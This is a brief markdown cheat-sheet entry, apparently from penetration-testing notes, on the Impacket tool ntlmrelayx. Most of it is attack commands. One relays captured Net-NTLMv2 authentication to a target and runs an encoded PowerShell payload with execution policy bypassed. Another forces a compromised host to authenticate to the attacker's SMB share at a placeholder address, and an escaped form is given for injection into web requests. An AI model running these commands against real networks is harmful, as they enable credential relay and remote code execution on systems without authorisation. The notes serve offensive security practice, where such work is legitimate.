---
tags:
---
# ntlmrelayx

For every connection received, this module will try to relay that connection to specified target(s) system or the original client

## Capabilities

```bash
# Relay an incomming Net-NTLMv2 hash to the target and execute the command
impacket-ntlmrelayx --no-http-server -smb2support -t $IP -c 'powershell -nop -noni -ep bypass -e JABjA...'
```

We can send a request to our attack box from our target inside a reverse shell via the following

```powershell
dir \\OUR_IP\a
```

**Note:** Make sure to include escape characters when injecting in a web request

```
\\\\OUR_IP\a
```